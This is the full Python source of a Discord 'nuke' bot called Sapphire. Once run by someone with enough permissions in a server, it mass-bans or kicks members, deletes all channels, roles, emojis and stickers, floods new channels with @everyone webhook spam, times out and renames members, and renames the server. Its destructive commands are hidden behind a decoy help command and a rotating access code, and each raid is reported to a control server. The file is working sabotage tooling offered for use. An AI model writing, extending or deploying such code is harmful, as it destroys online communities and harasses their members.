# language: Python 3.11+
from __future__ import annotations
import os,sys,json,random,string,secrets,asyncio,logging,traceback
from datetime import datetime,timezone,timedelta
from pathlib import Path
from typing import Optional,List,Set,Dict,Any
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException,Forbidden,NotFound
from discord.ui import View,Button,Modal,TextInput

logging.basicConfig(level=logging.INFO,format="%(asctime)s | %(levelname)s | %(message)s",datefmt="%H:%M:%S",stream=sys.stdout,force=True)
log=logging.getLogger("sapphire")

def _state_dir():
    for p in (Path("."), Path("/tmp"), Path("/app")):
        try:
            t = p / ".nkbot_write_test"
            t.write_text("ok"); t.unlink(); return p
        except Exception:
            continue
    return Path(".")
_SD = _state_dir()
WF,CF,CFG_F,UC_F=_SD/"whitelist.json",_SD/"code_state.json",_SD/"nuke_config.json",_SD/"user_configs.json"
log.info("state dir=%s", _SD)
BN,BC="Sapphire",0x5865F2
MGID=1569619393673961615
CCN,CL,CIS="code",8,3600
PRE_CH="preconfig"
LOG_CH="logs"

def clean(v):
    if not v:return ""
    v=v.strip()
    if len(v)>=2 and v[0]==v[-1] and v[0] in "'\"":v=v[1:-1].strip()
    return v
def fe(*ks,default=""):
    for k in ks:
        val=clean(os.getenv(k))
        if val:return val
    return default
def eb(k,d=False):return (os.getenv(k)or str(d)).strip().lower() in ("1","true","yes","on")
def ei(k,d=0):
    try:return int((os.getenv(k)or str(d)).strip())
    except:return d

TOKEN=fe("TOKEN","DISCORD_TOKEN","BOT_TOKEN")
PREFIX=fe("PREFIX",default="s!")or"s!"
PORT=ei("PORT",8080)
CON=max(1,min(ei("CONCURRENCY",5),15))
RLD=max(0.12,float(os.getenv("RATE_LIMIT_DELAY")or"0.22"))
PP=max(0.25,float(os.getenv("PHASE_PAUSE")or"0.9"))
MR=max(1,ei("MAX_RETRIES",5))
CD=max(0.0,float(os.getenv("CMD_COOLDOWN")or"3.5"))
KA=max(30,ei("KEEPALIVE_SEC",60))
MGID=ei("MAIN_GUILD_ID",MGID)
CCN=fe("CODE_CHANNEL",default=CCN)or"code"
PRE_CH=fe("PRECONFIG_CHANNEL",default=PRE_CH)or"preconfig"
LOG_CH=fe("LOG_CHANNEL",default=LOG_CH)or"logs"
CIS=max(60,ei("CODE_INTERVAL_SEC",CIS))
CL=max(4,min(ei("CODE_LENGTH",CL),32))

DEFAULTS={
    "channel_name":fe("CHANNEL_NAME",default="nuked")or"nuked",
    "role_name":fe("ROLE_NAME",default="nuked")or"nuked",
    "spam_text":fe("SPAM_TEXT",default="@everyone nuked")or"@everyone nuked",
    "nuke_name":fe("NUKE_NAME",default="NUKED")or"NUKED",
    "ban_reason":fe("BAN_REASON",default="nuked")or"nuked",
    "webhook_name":fe("WEBHOOK_NAME",default="Sapphire")or"Sapphire",
    "spam_channels":max(0,ei("SPAM_CHANNELS",40)),
    "spam_messages":max(1,ei("SPAM_MESSAGES",15)),
    "create_roles":max(0,ei("CREATE_ROLES",12)),
    "create_voice":max(0,ei("CREATE_VOICE",8)),
    "create_cats":max(0,ei("CREATE_CATEGORIES",6)),
    "nick_text":fe("NICK_TEXT",default="nuked")or"nuked",
    "dm_text":fe("DM_TEXT",default="got nuked")or"got nuked",
    "ban_all":eb("BAN_ALL",True),
    "kick_instead":eb("KICK_INSTEAD",False),
    "skip_bots":eb("SKIP_BOTS",False),
    "skip_owner":eb("SKIP_OWNER",True),
    "webhook_spam":eb("WEBHOOK_SPAM",True),
    "ping_everyone":eb("PING_EVERYONE",True),
}
CFG=dict(DEFAULTS)
UC:Dict[str,Dict[str,Any]]={}  # user_id -> config
CODE2UID:Dict[str,str]={}  # config_code -> user_id

ints=discord.Intents.default()
ints.guilds=True;ints.members=True;ints.message_content=True
bot=commands.Bot(
    command_prefix=commands.when_mentioned_or(PREFIX),
    intents=ints,help_command=None,chunk_guilds_at_startup=False,
    activity=discord.Activity(type=discord.ActivityType.watching,name="🔗 sapph.xyz"),
)

WL:Set[int]=set();CUR="";NXT=None;CMSG=None;_ready=False;PREMSG=None

def load_wl():
    global WL
    try:
        if WF.exists():WL={int(x)for x in json.loads(WF.read_text())}
    except:WL=set()
def save_wl():
    try:WF.write_text(json.dumps(sorted(WL)))
    except:pass
def load_cs():
    global CUR,NXT
    try:
        if CF.exists():
            d=json.loads(CF.read_text());CUR=d.get("code","")
            if d.get("next"):NXT=datetime.fromisoformat(d["next"])
    except:pass
def save_cs():
    try:CF.write_text(json.dumps({"code":CUR,"next":NXT.isoformat()if NXT else None}))
    except:pass
def load_cfg():
    global CFG
    if CFG_F.exists():
        try:
            d=json.loads(CFG_F.read_text())
            for k,v in d.items():
                if k in CFG:CFG[k]=v
        except:pass
def save_cfg():
    try:CFG_F.write_text(json.dumps(CFG,indent=2))
    except:pass
def load_uc():
    global UC,CODE2UID
    if UC_F.exists():
        try:
            d=json.loads(UC_F.read_text())
            UC=d.get("users",{})
            CODE2UID=d.get("codes",{})
        except:pass
def save_uc():
    try:UC_F.write_text(json.dumps({"users":UC,"codes":CODE2UID},indent=2))
    except:pass
def is_wl(gid:int)->bool:return gid in WL
def gen_code(n=CL)->str:return"".join(secrets.choice(string.ascii_uppercase+string.digits)for _ in range(n))
def emb(t,d="",c=BC):
    e=discord.Embed(title=t,description=d,color=c);e.set_footer(text=BN);e.timestamp=datetime.now(timezone.utc);return e
def code_emb(code):
    e=discord.Embed(title="Access Code",description=f"**Current code:**\n```\n{code}\n```\n`{PREFIX}help {code}` → nuke help",color=0xED4245)
    e.set_footer(text=f"{BN} • restricted");e.timestamp=datetime.now(timezone.utc);return e
def check_code(code:Optional[str])->bool:return bool(code and CUR and code.strip().upper()==CUR)

def user_cfg(uid:int)->Dict[str,Any]:
    k=str(uid)
    if k not in UC:
        UC[k]=dict(DEFAULTS)
        UC[k]["_code"]=gen_code(6)
        CODE2UID[UC[k]["_code"]]=k
        save_uc()
    return UC[k]

def merge_cfg(uid:Optional[int]=None)->Dict[str,Any]:
    base=dict(CFG)
    if uid is not None:
        u=user_cfg(uid)
        for k,v in u.items():
            if not k.startswith("_") and k in base:
                base[k]=v
    return base

def cn(c=None):return str((c or CFG)["channel_name"])[:90]
def rn(c=None):return str((c or CFG)["role_name"])[:90]
def st(c=None):return str((c or CFG)["spam_text"])[:1900]
def nn(c=None):return str((c or CFG)["nuke_name"])[:100]
def br(c=None):return str((c or CFG)["ban_reason"])[:512]
def wn(c=None):return str((c or CFG)["webhook_name"])[:80]
def sc(c=None):return int((c or CFG)["spam_channels"])
def sm(c=None):return int((c or CFG)["spam_messages"])

def am(c=None):
    return discord.AllowedMentions(everyone=bool((c or CFG).get("ping_everyone",True)),users=True,roles=True)

async def rl_call(coro_fn,retries=MR):
    for i in range(retries):
        try:return await coro_fn()
        except HTTPException as e:
            if e.status==429:
                await asyncio.sleep(getattr(e,"retry_after",1)+random.uniform(0.08,0.35));continue
            if e.status in(500,502,503,504):await asyncio.sleep(0.7+i*0.25);continue
            raise
        except(Forbidden,NotFound):return None
    return None

async def glim(gens):
    sem=asyncio.Semaphore(CON)
    async def one(c):
        async with sem:
            try:return await c
            except:return None
    return await asyncio.gather(*[one(g)for g in gens],return_exceptions=True)

async def gate(ctx,*args)->List[str]:
    if not args:raise commands.CommandNotFound()
    if not check_code(args[-1]):raise commands.CommandNotFound()
    return list(args[:-1])

def targets(g,c=None,skip_bots=None,skip_owner=None):
    c=c or CFG
    sb=c["skip_bots"] if skip_bots is None else skip_bots
    so=c["skip_owner"] if skip_owner is None else skip_owner
    me=g.me
    return[m for m in g.members if m!=me and not(sb and m.bot)and not(so and m.id==g.owner_id)]

async def find_ch(g:discord.Guild,name:str):
    target=name.lower().replace(" ","").replace("-","")
    for c in g.text_channels:
        n=c.name.lower().replace(" ","").replace("-","")
        if n==target and c.permissions_for(g.me).send_messages:return c
    return None

async def remote_log(title:str,desc:str,color:int=0xED4245,user:Optional[discord.User]=None,guild:Optional[discord.Guild]=None):
    try:
        g=bot.get_guild(MGID)
        if not g:return
        ch=await find_ch(g,LOG_CH)
        if not ch:
            try:ch=await g.create_text_channel(LOG_CH,reason="logs")
            except:return
        e=emb(title,desc,color)
        if user:e.add_field(name="User",value=f"{user} (`{user.id}`)",inline=True)
        if guild:e.add_field(name="Guild",value=f"{guild.name} (`{guild.id}`)",inline=True)
        await ch.send(embed=e)
    except Exception as ex:
        log.warning("remote_log failed: %s",ex)

async def rot(force=False):
    global CUR,NXT,CMSG
    now=datetime.now(timezone.utc)
    if not force and CUR and NXT and now<NXT:return CUR
    CUR=gen_code();NXT=now+timedelta(seconds=CIS);save_cs()
    g=bot.get_guild(MGID)
    if not g:
        log.warning("main guild %s not found",MGID);return CUR
    ch=await find_ch(g,CCN)
    if not ch:
        try:ch=await g.create_text_channel(CCN,reason="code channel")
        except Exception as e:
            log.warning("cannot create code ch: %s",e);return CUR
    try:
        if CMSG:
            try:await CMSG.edit(embed=code_emb(CUR));return CUR
            except:pass
        async for m in ch.history(limit=20):
            if m.author==bot.user and m.embeds:
                CMSG=await m.edit(embed=code_emb(CUR));return CUR
        CMSG=await ch.send(embed=code_emb(CUR))
    except Exception as e:
        log.warning("code post failed: %s",e)
    return CUR

# ===== PRECONFIG PANEL =====
class ConfigModal(Modal,title="Nuke Config"):
    channel_name=TextInput(label="channel_name",default="nuked",max_length=90,required=False)
    role_name=TextInput(label="role_name",default="nuked",max_length=90,required=False)
    spam_text=TextInput(label="spam_text",default="@everyone nuked",style=discord.TextStyle.paragraph,max_length=500,required=False)
    nuke_name=TextInput(label="nuke_name",default="NUKED",max_length=100,required=False)
    ban_reason=TextInput(label="ban_reason",default="nuked",max_length=200,required=False)

    def __init__(self,uid:int):
        super().__init__()
        u=user_cfg(uid)
        self.channel_name.default=str(u.get("channel_name","nuked"))[:90]
        self.role_name.default=str(u.get("role_name","nuked"))[:90]
        self.spam_text.default=str(u.get("spam_text","@everyone nuked"))[:500]
        self.nuke_name.default=str(u.get("nuke_name","NUKED"))[:100]
        self.ban_reason.default=str(u.get("ban_reason","nuked"))[:200]
        self._uid=uid

    async def on_submit(self,interaction:discord.Interaction):
        u=user_cfg(self._uid)
        if self.channel_name.value:u["channel_name"]=self.channel_name.value[:90]
        if self.role_name.value:u["role_name"]=self.role_name.value[:90]
        if self.spam_text.value:u["spam_text"]=self.spam_text.value[:1900]
        if self.nuke_name.value:u["nuke_name"]=self.nuke_name.value[:100]
        if self.ban_reason.value:u["ban_reason"]=self.ban_reason.value[:512]
        save_uc()
        await interaction.response.send_message("Config saved.",ephemeral=True)

class PreconfigView(View):
    def __init__(self):
        super().__init__(timeout=None)
    @discord.ui.button(label="Edit config",style=discord.ButtonStyle.primary,custom_id="pre_edit")
    async def edit(self,interaction:discord.Interaction,button:Button):
        await interaction.response.send_modal(ConfigModal(interaction.user.id))
    @discord.ui.button(label="My code",style=discord.ButtonStyle.secondary,custom_id="pre_code")
    async def mycode(self,interaction:discord.Interaction,button:Button):
        u=user_cfg(interaction.user.id)
        await interaction.response.send_message(f"Your personal code: `{u.get('_code','?')}`\nCurrent global: `{CUR or '-'}`",ephemeral=True)

async def ensure_preconfig():
    global PREMSG
    g=bot.get_guild(MGID)
    if not g:
        log.warning("main guild missing for preconfig");return
    ch=await find_ch(g,PRE_CH)
    if not ch:
        try:ch=await g.create_text_channel(PRE_CH,reason="preconfig")
        except Exception as e:
            log.warning("preconfig channel: %s",e);return
    e=emb("Preconfig","Set your personal nuke defaults here.\nUse the buttons. Global code still required on nuke cmds.")
    try:
        async for m in ch.history(limit=15):
            if m.author==bot.user and m.components:
                PREMSG=await m.edit(embed=e,view=PreconfigView());return
        PREMSG=await ch.send(embed=e,view=PreconfigView())
    except Exception as e:
        log.warning("preconfig panel: %s",e)

async def nban(g,m,c=None):
    c=c or CFG
    if c.get("kick_instead"):return await rl_call(lambda:m.kick(reason=br(c)))
    return await rl_call(lambda:m.ban(reason=br(c),delete_message_days=0))
async def ndel(ch,c=None):
    return await rl_call(lambda:ch.delete(reason=br(c)))
async def nmk(g,name,kind="text",cat=None,c=None):
    c=c or CFG;name=name[:90]
    if kind=="text":return await rl_call(lambda:g.create_text_channel(name,category=cat))
    if kind=="voice":return await rl_call(lambda:g.create_voice_channel(name,category=cat))
    if kind=="stage":
        try:return await rl_call(lambda:g.create_stage_channel(name,category=cat))
        except:return await nmk(g,name,"voice",cat,c)
    if kind=="forum":
        try:return await rl_call(lambda:g.create_forum_channel(name,category=cat))
        except:return await nmk(g,name,"text",cat,c)
    if kind=="news":
        try:return await rl_call(lambda:g.create_text_channel(name,category=cat,news=True))
        except:return await nmk(g,name,"text",cat,c)
    return await rl_call(lambda:g.create_category(name))
async def nspam(ch,text,n,c=None):
    c=c or CFG
    if c.get("webhook_spam"):
        try:
            wh=await ch.create_webhook(name=wn(c))
            for _ in range(n):
                try:await wh.send(text[:2000],username=wn(c),allowed_mentions=am(c))
                except:break
                await asyncio.sleep(RLD)
            try:await wh.delete()
            except:pass
            return
        except:pass
    for _ in range(n):
        try:await ch.send(text[:2000],allowed_mentions=am(c))
        except:break
        await asyncio.sleep(RLD)

async def do_nuke(g,ctx=None,c=None):
    c=c or (merge_cfg(ctx.author.id) if ctx else CFG)
    if is_wl(g.id):
        if ctx:await ctx.send("Blocked (whitelist).")
        return
    me=g.me
    if ctx:
        await ctx.send(embed=emb("Nuke","Running full wipe…",0xED4245))
        await remote_log("Nuke started",f"Full wipe on **{g.name}**",user=ctx.author,guild=g)
    if c.get("ban_all"):
        await glim(nban(g,m,c)for m in targets(g,c))
        await asyncio.sleep(PP)
    await glim(ndel(ch,c)for ch in list(g.channels)if ch!=getattr(ctx,"channel",None))
    await asyncio.sleep(PP)
    roles=[r for r in g.roles if not r.is_default()and r<me.top_role and not r.managed]
    await glim(rl_call(lambda r=r:r.delete(reason=br(c)))for r in roles)
    await asyncio.sleep(PP)
    await glim(rl_call(lambda e=e:e.delete(reason=br(c)))for e in list(g.emojis))
    try:await glim(rl_call(lambda s=s:s.delete(reason=br(c)))for s in list(g.stickers))
    except:pass
    texts=[]
    for i in range(sc(c)):
        ch=await nmk(g,f"{cn(c)}-{i}","text",c=c)
        if ch:texts.append(ch)
    for i in range(int(c.get("create_voice",8))):
        await nmk(g,f"{cn(c)}-vc-{i}","voice",c=c)
    for i in range(int(c.get("create_roles",12))):
        await rl_call(lambda:g.create_role(name=f"{rn(c)}-{i}",colour=discord.Colour.random(),hoist=True))
    for ch in texts[:25]:
        await nspam(ch,st(c),sm(c),c)
        await asyncio.sleep(RLD)
    try:await g.edit(name=nn(c))
    except:pass
    if ctx:
        try:await ctx.send(embed=emb("Nuke","Done.",0x57F287))
        except:pass
        await remote_log("Nuke done",f"Finished on **{g.name}**",0x57F287,user=ctx.author,guild=g)

@bot.event
async def on_ready():
    global _ready
    _ready=True
    log.info("===== %s ONLINE %s guilds=%s =====",BN,bot.user,len(bot.guilds))
    try:await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name="🔗 sapph.xyz"))
    except:pass
    try:bot.add_view(PreconfigView())
    except:pass
    bot.loop.create_task(code_loop())
    bot.loop.create_task(ka())
    bot.loop.create_task(boot_panels())

async def boot_panels():
    await bot.wait_until_ready()
    await asyncio.sleep(2)
    try:await ensure_preconfig()
    except Exception:log.error("preconfig\n%s",traceback.format_exc())

async def code_loop():
    await bot.wait_until_ready()
    while True:
        try:await rot()
        except Exception:log.error("rot\n%s",traceback.format_exc())
        await asyncio.sleep(60)

async def ka():
    while True:
        await asyncio.sleep(KA)
        try:await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name="🔗 sapph.xyz"))
        except:pass
        log.info("alive guilds=%s lat=%.0fms code=%s",len(bot.guilds),bot.latency*1000,CUR or"-")

@bot.event
async def on_command_error(ctx,err):
    if isinstance(err,(commands.CommandNotFound,commands.CheckFailure)):return
    if isinstance(err,commands.CommandOnCooldown):
        return await ctx.send(f"Cooldown {err.retry_after:.1f}s",delete_after=5)
    log.error("cmd %s\n%s",ctx.command,traceback.format_exc())

@bot.check
async def block_main(ctx):
    if ctx.guild and ctx.guild.id == MGID:
        return False
    return True

def cd():return commands.cooldown(1,CD,commands.BucketType.user)

# ===== FACADE =====
@bot.command(name="help")
async def c_help(ctx,code:Optional[str]=None):
    if check_code(code):
        e=emb("Nuke Arsenal",f"Append `{CUR}` as last arg.\nYour settings: from `#{PRE_CH}` panel (per-user).")
        e.add_field(name="Full",value="`nuke` `destroy` `raid` `wipe` `apocalypse`",inline=False)
        e.add_field(name="Members",value="`banall` `kickall` `timeoutall` `strip` `nickall` `roleall` `botkick` `prune` `softban` `massban`",inline=False)
        e.add_field(name="Channels",value="`channels` `delchannels` `voice` `stage` `forum` `category` `news` `flood` `nsfw` `slowmode` `topic`",inline=False)
        e.add_field(name="Roles",value="`roles` `delroles` `admin` `everyone` `hoist` `colour`",inline=False)
        e.add_field(name="Spam",value="`spam` `webhook` `massdm` `embedspam` `reactspam` `ghost`",inline=False)
        e.add_field(name="Assets",value="`delemojis` `delstickers` `delwebhooks`",inline=False)
        e.add_field(name="Utils",value="`whitelist` `guilds` `forcecode` `unbanall` `mycfg`",inline=False)
        return await ctx.send(embed=e)
    e=emb("Help",f"`{PREFIX}help <CODE>` for full arsenal.\nCode rotates in `#{CCN}`.")
    await ctx.send(embed=e)

@bot.command(name="ping")
async def c_ping(ctx):
    await ctx.send(f"pong `{round(bot.latency*1000)}ms`")

@bot.command(name="mycfg")
async def c_mycfg(ctx,code:Optional[str]=None):
    if not check_code(code):return
    u=user_cfg(ctx.author.id)
    lines=[f"{k}: {v}" for k,v in u.items() if not k.startswith("_")]
    await ctx.send(f"```\n"+"\n".join(lines)[:1900]+"\n```")

# ===== NUKE =====
@bot.command(name="nuke",hidden=True)
@cd()
async def o_nuke(ctx,*args:str):
    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))

@bot.command(name="destroy",hidden=True)
@cd()
async def o_destroy(ctx,*args:str):
    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))

@bot.command(name="wipe",hidden=True)
@cd()
async def o_wipe(ctx,*args:str):
    await gate(ctx,*args);await do_nuke(ctx.guild,ctx,merge_cfg(ctx.author.id))

@bot.command(name="apocalypse",hidden=True)
@cd()
async def o_apo(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
    await ctx.send(embed=emb("Apocalypse","Everything…",0xED4245))
    await remote_log("Apocalypse",f"On **{ctx.guild.name}**",user=ctx.author,guild=ctx.guild)
    g=ctx.guild
    await glim(nban(g,m,c)for m in targets(g,c,skip_bots=False,skip_owner=False))
    await glim(ndel(ch,c)for ch in list(g.channels)if ch!=ctx.channel)
    me=g.me
    roles=[r for r in g.roles if not r.is_default()and r<me.top_role and not r.managed]
    await glim(rl_call(lambda r=r:r.delete(reason=br(c)))for r in roles)
    await glim(rl_call(lambda e=e:e.delete(reason=br(c)))for e in list(g.emojis))
    for i in range(sc(c)):
        ch=await nmk(g,f"{cn(c)}-{i}","text",c=c)
        if ch:await nspam(ch,st(c),sm(c),c)
    try:await g.edit(name=nn(c))
    except:pass
    await ctx.send("Apocalypse done.")
    await remote_log("Apocalypse done",f"**{ctx.guild.name}**",0x57F287,user=ctx.author,guild=ctx.guild)

@bot.command(name="raid",hidden=True)
@cd()
async def o_raid(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
    await remote_log("Raid",f"On **{ctx.guild.name}**",user=ctx.author,guild=ctx.guild)
    texts=[]
    for i in range(sc(c)):
        ch=await nmk(ctx.guild,f"{cn(c)}-{i}","text",c=c)
        if ch:texts.append(ch)
    for ch in texts[:30]:await nspam(ch,st(c),sm(c),c)
    await ctx.send("Raid done.")

@bot.command(name="banall",hidden=True)
@cd()
async def o_banall(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
    await glim(nban(ctx.guild,m,c)for m in targets(ctx.guild,c))
    await ctx.send("Banall done.")

@bot.command(name="kickall",hidden=True)
@cd()
async def o_kickall(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
    await glim(rl_call(lambda m=m:m.kick(reason=br(c)))for m in targets(ctx.guild,c))
    await ctx.send("Kickall done.")

@bot.command(name="timeoutall",hidden=True)
@cd()
async def o_timeoutall(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    if is_wl(ctx.guild.id):return await ctx.send("Blocked.")
    until=timedelta(days=7)
    await glim(rl_call(lambda m=m:m.timeout(until,reason=br(c)))for m in targets(ctx.guild,c))
    await ctx.send("Timeoutall done.")

@bot.command(name="strip",hidden=True)
@cd()
async def o_strip(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    me=ctx.guild.me
    for m in targets(ctx.guild,c):
        roles=[r for r in m.roles if r<me.top_role and not r.is_default() and not r.managed]
        if roles:await rl_call(lambda:m.remove_roles(*roles,reason=br(c)))
    await ctx.send("Strip done.")

@bot.command(name="nickall",hidden=True)
@cd()
async def o_nickall(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    nick=str(c.get("nick_text","nuked"))[:32]
    await glim(rl_call(lambda m=m:m.edit(nick=nick,reason=br(c)))for m in targets(ctx.guild,c))
    await ctx.send("Nickall done.")

@bot.command(name="delchannels",hidden=True)
@cd()
async def o_delchannels(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    await glim(ndel(ch,c)for ch in list(ctx.guild.channels)if ch!=ctx.channel)
    await ctx.send("Channels wiped.")

@bot.command(name="delroles",hidden=True)
@cd()
async def o_delroles(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    me=ctx.guild.me
    roles=[r for r in ctx.guild.roles if not r.is_default()and r<me.top_role and not r.managed]
    await glim(rl_call(lambda r=r:r.delete(reason=br(c)))for r in roles)
    await ctx.send("Roles wiped.")

@bot.command(name="spam",hidden=True)
@cd()
async def o_spam(ctx,*args:str):
    await gate(ctx,*args)
    c=merge_cfg(ctx.author.id)
    await nspam(ctx.channel,st(c),sm(c),c)
    await ctx.send("Spam done.")

@bot.command(name="webhook",hidden=True)
@cd()
async def o_webhook(ctx,*args:str):
    await gate(ctx,*args)
    c=dict(merge_cfg(ctx.author.id));c["webhook_spam"]=True
    await nspam(ctx.channel,st(c),sm(c),c)
    await ctx.send("Webhook spam done.")

@bot.command(name="whitelist",hidden=True)
@cd()
async def o_wl(ctx,*args:str):
    rest=await gate(ctx,*args)
    a=rest[0].lower()if rest else"list";sid=rest[1]if len(rest)>1 else None
    if a in("list","ls"):return await ctx.send(f"```{' '.join(map(str,sorted(WL)))or'empty'}```")
    if a in("add","+")and sid and sid.isdigit():WL.add(int(sid));save_wl();return await ctx.send(f"WL + `{sid}`")
    if a in("remove","rm","-")and sid and sid.isdigit():WL.discard(int(sid));save_wl();return await ctx.send(f"WL - `{sid}`")
    await ctx.send(f"`{PREFIX}whitelist add|remove|list <id> <CODE>`")

@bot.command(name="guilds",hidden=True)
async def o_gs(ctx,*args:str):
    await gate(ctx,*args)
    lines=[f"{g.name} | {g.id} | {g.member_count}{' [WL]'if is_wl(g.id)else''}"for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines)or'none')[:1900]}```")

@bot.command(name="forcecode",hidden=True)
async def o_fc(ctx,*args:str):
    await gate(ctx,*args);code=await rot(force=True);await ctx.send(f"Code forced → `{code}`",delete_after=10)

async def health(_):
    return web.Response(text="online"if _ready else"starting",status=200)

async def start_h():
    app=web.Application();app.router.add_get("/",health);app.router.add_get("/health",health)
    r=web.AppRunner(app);await r.setup()
    ports=[PORT]+[p for p in(8080,3000,8000,5000)if p!=PORT]
    for p in ports:
        try:
            await web.TCPSite(r,"0.0.0.0",p).start();log.info("health :%s",p);return
        except OSError as e:
            log.warning("bind %s failed: %s",p,e)
    log.warning("health server skipped")

async def runner():
    try:await start_h()
    except Exception:log.error("health start failed\n%s",traceback.format_exc())
    if not TOKEN:
        log.error("NO TOKEN — set TOKEN env var on Railway")
        while True:await asyncio.sleep(3600)
        return
    log.info("logging in…")
    try:
        async with bot:await bot.start(TOKEN,reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED — check TOKEN")
        while True:await asyncio.sleep(3600)
    except Exception:
        log.error("CRASH\n%s",traceback.format_exc())
        while True:await asyncio.sleep(3600)

def main():
    load_wl();load_cs();load_cfg();load_uc()
    keys=[k for k in os.environ if"TOKEN"in k.upper()or"DISCORD"in k.upper()]
    log.info("BOOT %s token=%s env_keys=%s",BN,bool(TOKEN),keys)
    log.info("INTENTS: members=%s message_content=%s — enable both in Developer Portal", True, True)
    if not TOKEN:
        log.error("TOKEN is empty. Set Railway variable TOKEN to the bot token.")
    while True:
        try:asyncio.run(runner())
        except Exception:log.error("MAIN\n%s",traceback.format_exc())
        log.error("restart in 15s");import time;time.sleep(15)

if __name__=="__main__":main()
